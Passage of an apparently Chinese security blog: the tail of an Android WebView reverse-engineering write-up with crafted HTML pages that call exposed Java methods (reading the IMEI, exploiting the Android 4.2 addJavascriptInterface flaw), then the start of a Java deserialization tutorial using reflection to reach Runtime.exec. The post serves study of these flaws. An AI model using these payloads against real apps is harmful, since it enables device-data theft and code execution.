<p> addJavascriptInterface方法一般用法：<br>mWebView.addJavascriptInterface(new JavaScriptObject(this), “objName”);<br>第一个参数是本地的Java对象，第二个参数是给Js中使用的对象的名称。然后js得到这个对象的名称就可以调用本地的Java对象中的方法了。<br>将js中的名称（objName）进行混淆加密，是为了防止恶意的网站来拦截url，然后调用我们本地的Java中的方法。</p>
</blockquote>
<p>比如，现在有一个程序有一个获取设备重要信息的方法，比如获取设备的imei，如果没有名称混淆的话，破解者得到这个JS名称和方法名，然后伪造一个恶意url来调用我们程序中的这个方法：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaScriptObject</span> </span>&#123;</span><br><span class="line">    Context mContxt;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JavaScriptObject</span><span class="params">(Context mContxt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mContxt = mContxt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* sdk17以上加注解，JS中能够访问设置了这个注解的方法，</span></span><br><span class="line"><span class="comment">     * 没有这个注解的本地Java方法JS是访问不了的。*/</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getimei</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);</span><br><span class="line">        <span class="keyword">return</span> tm.getDeviceId();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再设置js名称：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> JavaScriptObject(<span class="keyword">this</span>), <span class="string">&quot;objName&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>下面就可以伪造一个恶意的url页面来访问这个方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">crackali</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> objName.getimei();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    Crack...</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">var</span> imei = crackali();</span><br><span class="line">        alert(<span class="string">&quot;I am cracked...&quot;</span> + imei);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>但是由于兼容性和安全性问题，基本上我们不会再用Android系统提供的addJavascriptInterface方法或@JavascriptInterface注解了，不多介绍，可以查JSBridge。</p>
</blockquote>
<p>到这里就分析完了apk的逻辑了，下面来整理一下：<br>1、在MainActivity中输入一个页面的url，跳转到WebViewActivity进行展示；<br>2、WebViewActivity有Js交互，需要调用本地Java对象中的showToast方法展示消息。<br>问题：<br>因为这里的js对象名称进行了加密，所以这里我们自己编写一个网页，但是不知道这个js对象名称，无法完成showToast方法的调用。</p>
<h3 id="破解的方法"><a href="#破解的方法" class="headerlink" title="破解的方法"></a>破解的方法</h3><p>破解的方法有以下几种：<br>1.修改smali源码，将上面的js对象名称改成任意其他值，如”objName”，然后用smali工具编译成DEX文件，重打包，再在自己编写的页面中调用：objName.showToast方法即可。<br>2.利用Android4.2中的WebView漏洞，直接使用如下Js代码：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            function findobj() &#123;</span><br><span class="line">                for (var obj in window) &#123;</span><br><span class="line">                    if (&quot;getClass&quot; in window[obj]) &#123;</span><br><span class="line">                        return window[obj]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        hello world!</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            var obj &#x3D; findobj()</span><br><span class="line">            obj.showToast()</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>3.自己写一个程序，调用那个加密方法，就能得到正确的js对象名称。<br>这里使用第三种方法：<br><img src="/images/androidre/decrypt_native.png"><br>可以看到加密方法是translate库中的，因此新建一个Android项目，将translate库放到项目中，写一段代码调用native方法：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String val = ListViewAutoScrollHelpern.decrypt_native(<span class="string">&quot;BQ1$*[w6G_&quot;</span>, <span class="number">2</span>);</span><br><span class="line">Log.i(<span class="string">&quot;objName&quot;</span>, <span class="string">&quot;val:&quot;</span>+val);</span><br></pre></td></tr></table></figure>
<p>运行会报错，原因是少了两个类，根据错误提示构造这两个类，再运行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objName: val:SmokeyBear</span><br></pre></td></tr></table></figure>
<p>解密之后的JS对象的名称是SmokeyBear，下面构造一个url页面，直接调用：SmokeyBear.showToast即可。</p>
<blockquote>
<p>如果知道了Java层的native方法的定义，就可以调用这个native方法了，这是很不安全的，可以在so中的native函数做一个应用的签名校验，只有属于自己的签名应用才能调用，否则直接退出。</p>
</blockquote>
<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>构造页面：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            function alicrack() &#123;</span><br><span class="line">                SmokeyBear.showToast()</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        Crack...</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            alicrack();</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>构造好的页面可以放到服务器上或存到本地，WebView的loadUrl方法是可以加载本地页面的，但不能存到SD卡上，因为这个应用没有读取SD卡的权限。放到/data/data/com.ali.tg.testapp/目录下即可。WebView加载本地页面的格式是：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.ali.tg.testapp&#x2F;crack.html</span><br></pre></td></tr></table></figure>
<p>在手机上输入这么多内容比较麻烦，这里有一个技巧，用命令行输入：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell input text &quot;content to input&quot;</span><br></pre></td></tr></table></figure>
<p>点击按钮运行，成功！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.wjdiankong.cn/android%E9%80%86%E5%90%91%E4%B9%8B%E6%97%85-%E5%8A%A8%E6%80%81%E6%96%B9%E5%BC%8F%E7%A0%B4%E8%A7%A3apk%E7%BB%88%E6%9E%81%E7%AF%87%E5%BA%94%E5%AF%B9%E5%8A%A0%E5%9B%BAapk%E7%A0%B4%E8%A7%A3%E6%96%B9/">Android逆向之旅—动态方式破解apk终极篇(应对加固apk破解方式)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">Java反序列化漏洞（一）基础知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-01 14:40:34" itemprop="dateCreated datePublished" datetime="2017-04-01T14:40:34+08:00">2017-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>要理解Java反序列化漏洞需要一些Java的相关知识：<br>1.使用Java反射机制<br>2.利用sun.reflect.annotation.AnnotationInvocationHandler类<br>3.调用TransformedMap类的decorate方法时，参数一的Map对象需要put进”value”与非空的值<br>4.AnnotationInvocationHandler类的实例化参数一需要为java.lang.annotation.Retention类<br>下面先介绍基础知识，再利用类TransformedMap与AnnotationInvocationHandler分析漏洞。</p>
<h2 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h2><p>Java序列化：使用ObjectOutputStream.writeObject方法可对实现了Serializable接口的对象进行序列化，序列化的数据可存储在文件中，或通过网络传输。<br>Java反序列化：使用ObjectInputStream.readObject方法可对序列化的数据进行反序列化。当实现了Serializable接口的对象被反序列化时，该对象的readObject方法会被调用。<br>String实现了Serializable接口，可进行序列化。以下测试代码对String类的对象进行序列化，将序列化的数据保存在文件中，再从文件读取序列化的数据进行反序列化。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Basic</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        String test = <span class="string">&quot;tttest&quot;</span>; <span class="comment">// 需要序列化的对象</span></span><br><span class="line">        <span class="comment">// 将序列化数据写入文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(test);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">// 从文件读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        String stringFromData = (String)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(stringFromData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Java序列化数据的magic-number"><a href="#Java序列化数据的magic-number" class="headerlink" title="Java序列化数据的magic number"></a>Java序列化数据的magic number</h3><p>java.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。即0xaced为Java对象序列化流的魔数，0x0005为Java对象序列化的版本号，Java对象序列化数据的前4个字节为”AC ED 00 05”。<br>查看上一步生成的文件：<br><img src="/images/serialize/str-test.png"></p>
<h3 id="对自定义类的序列化与反序列化"><a href="#对自定义类的序列化与反序列化" class="headerlink" title="对自定义类的序列化与反序列化"></a>对自定义类的序列化与反序列化</h3><p>下面的测试代码为SerializeMyClass类，在其中定义了内部类MyObject。MyObject类实现了Serializable接口，SerializeMyClass类会对MyObject类的对象进行序列化，将序列化的数据保存在文件中，再从文件读取序列化的数据进行反序列化。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeMyClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 需要序列化的对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject(<span class="string">&quot;tttest&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test-myobj.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(myObj); <span class="comment">// 将序列化数据写到文件</span></span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test-myobj.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        MyObject objectFromData = (MyObject) ois.readObject(); <span class="comment">// 从文件读取序列化数据</span></span><br><span class="line">        ois.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(objectFromData.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;initial&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;no name-default&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyObject(String name) &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyObject(String name) &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重写了Serializable接口的readObject方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">        ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;MyObject-readObject!!!! &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="keyword">this</span>.name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序输出：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MyObject(String name) tttest</span><br><span class="line">MyObject-readObject!!!! tttest</span><br><span class="line">tttest!</span><br></pre></td></tr></table></figure>
<p>可以看到MyObject类实现的Serializable接口的readObject方法会被调用，且对象被序列化再反序列化后，对其值没有影响。<br><img src="/images/serialize/myobj-test.png"></p>
<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>之前写过一篇<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/04/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">Java反射机制</a>的文章，不过只是一些理论类的东西，跟文档差不多，这里实际使用一下。<br>(1)调用FileOutputStream类写文件时，常用代码如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">fos.write(<span class="string">&quot;abc&quot;</span>.getBytes());</span><br></pre></td></tr></table></figure>
<p>若需要使用Java反射机制调用FileOutputStream类写文件，且只允许调用Class.getMethod与Method.invoke方法，需要使用如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectBasic</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, </span></span><br><span class="line"><span class="function">    IllegalAccessException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        Object object = FileOutputStream.class;</span><br><span class="line">        Class cls = object.getClass(); <span class="comment">// class java.lang.Class</span></span><br><span class="line">        <span class="comment">/* getMethod第二个参数是一个Class数组，数组中是获取的method的参数类型，</span></span><br><span class="line"><span class="comment">         * getConstructor的参数类型是Class数组，数组中是构造函数的参数类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Method method = cls.getMethod(<span class="string">&quot;getConstructor&quot;</span>, <span class="keyword">new</span> Class[] &#123; Class[].class &#125;);</span><br><span class="line">        <span class="comment">// invoke第二个参数是一个Object数组，数组中是调用的方法的参数</span></span><br><span class="line">        object = method.invoke(object, <span class="keyword">new</span> Object[] &#123; <span class="keyword">new</span> Class[] &#123; String.class &#125; &#125;);</span><br><span class="line">        cls = object.getClass();</span><br><span class="line">        <span class="comment">// newInstance的参数类型是Object数组</span></span><br><span class="line">        method = cls.getMethod(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object[].class &#125;);</span><br><span class="line">        object = method.invoke(object, <span class="keyword">new</span> Object[] &#123; <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;./1.txt&quot;</span> &#125;&#125;);</span><br><span class="line">        cls = object.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">&quot;write&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;);</span><br><span class="line">        object = method.invoke(object, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;abc&quot;</span>.getBytes()&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(2)使用Java反射机制调用Runtime类执行程序，常用代码如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>如果使用Java反射机制调用Runtime类执行程序，且只允许调用Class.getMethod与Method.invoke方法，上述代码需修改为如下形式。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Object object = Runtime.class;</span><br><span class="line">Class cls = object.getClass();</span><br><span class="line"><span class="comment">/* 此时cls的类型为Class而不是Runtime，只能先获取getMethod方法并调用，</span></span><br><span class="line"><span class="comment"> * 以获取Runtime类的getRuntime方法，无法直接获取getRuntime方法 */</span></span><br><span class="line">Method method = cls.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;);</span><br><span class="line">object = method.invoke(object, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line">System.out.println(<span class="string">&quot;-1- &quot;</span> + object.getClass());</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 此时cls为Method，对应getRuntime方法，获取invoke方法并执行</span></span><br><span class="line">cls = object.getClass();</span><br><span class="line">method = cls.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;);</span><br><span class="line">object = method.invoke(object, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 此时cls为Runtime，对应Runtime.getRuntime()的结果，可调用exec方法</span></span><br><span class="line">cls = object.getClass();</span><br><span class="line">method = cls.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;);</span><br><span class="line">object = method.invoke(object, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;/usr/bin/open /Applications/Notes.app&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Java反射机制与序列化"><a href="#Java反射机制与序列化" class="headerlink" title="Java反射机制与序列化"></a>Java反射机制与序列化</h2><p>当需要操作无法直接访问的类时，需要使用Java的反射机制。即对无法直接访问的类进行序列化时，需要使用Java的反射机制。<br>以下测试代码为testreflection.TestReflection类，与前文中的test.MyObject类不在同一个包中，在TestReflection类中对MyObject类进行序列化时，需要使用Java的反射机制。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> testreflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestReflection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        doSerialize(<span class="string">&quot;tttest&quot;</span>);</span><br><span class="line">        doSerialize(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doSerialize</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;test.MyObject&quot;</span>);</span><br><span class="line">        Constructor ctor = <span class="keyword">null</span>;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (data != <span class="keyword">null</span>)</span><br><span class="line">            ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123; String.class &#125;);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ctor = cls.getDeclaredConstructor();</span><br><span class="line">        </span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        